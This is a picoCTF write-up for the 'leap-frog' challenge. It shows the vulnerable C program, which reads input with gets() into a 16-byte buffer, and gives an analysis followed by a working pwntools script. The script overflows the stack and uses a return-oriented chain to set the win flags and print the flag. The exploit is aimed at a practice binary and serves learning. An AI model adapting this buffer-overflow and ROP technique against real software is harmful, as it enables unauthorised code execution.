[Back](PicoFrontPage.md)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>


#define FLAG_SIZE 64

bool win1 = false;
bool win2 = false;
bool win3 = false;

void leapA() {
  win1 = true;
}

void leap2(unsigned int arg_check) {
  if (win3 && arg_check == 0xDEADBEEF) {
    win2 = true;
  }
  else if (win3) {
    printf("Wrong Argument. Try Again.\n");
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void leap3() {
  if (win1 && !win1) {
    win3 = true;
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void display_flag() {
  char flag[FLAG_SIZE];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  
  if (win1 && win2 && win3) {
    printf("%s", flag);
    return;
  }
  else if (win1 || win3) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}

void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
```

### Analysis

This challenge requires us to set `win1`, `win2` and `win3` to true before calling `display_flag()` to complete the it and spit out the flag.

- `leapA()` requires us to simply call it to set `win1` to true 
- `leap2()` requires us to have set `win3` to true and supply the argument `0xDEADBEEF`
- `leap3()`, however, requires us to have set `win1` to both true and false

However, we don't actually need to call these functions to clear the challenge. We can simply set `win1`, `win2` and `win3` to 1 (or true).
Find out the bytes required to reach `$eip` as usual and from there we're going to use ROP to call `gets()`, `display_flag()` and set the `win` variables to `0x01`.
If we check we can actually see that all three `win` variables are right next to each other at locations: `0x804A03D`, `0x804A03E`, `0x804A03F`, respectively. This means we can just need to reach `win1` and we will be able to set them to 1.

```python
from pwn import *

s = ssh(host='2019shell1.picoctf.com', user='Username', password='Password')
p = s.process('/problems/leap-frog_3_5d6cea2f1cec97458549353ec1e7e158/rop', cwd='/problems/leap-frog_3_5d6cea2f1cec97458549353ec1e7e158')

# variables
pop_ebp_ret = 0x080485fb
win1 = 0x0804A03D
display_flag = 0x80486b3

bss = 0x0804a03c
new_stack = bss + 0x900
get_input = 0x80487b8

gets = 0x08048430

# create payload
payload = b'A'*28 # 28 bytes to overwrite eip
payload += p32(gets)
payload += p32(display_flag)
payload += p32(win1)

# receive until > is read
p.recvuntil(b'input>')

# send payload as one line
p.sendline(payload)
set_true = p32(0x010101)
p.sendline(set_true)

# always do this we want a shell
p.interactive()
```
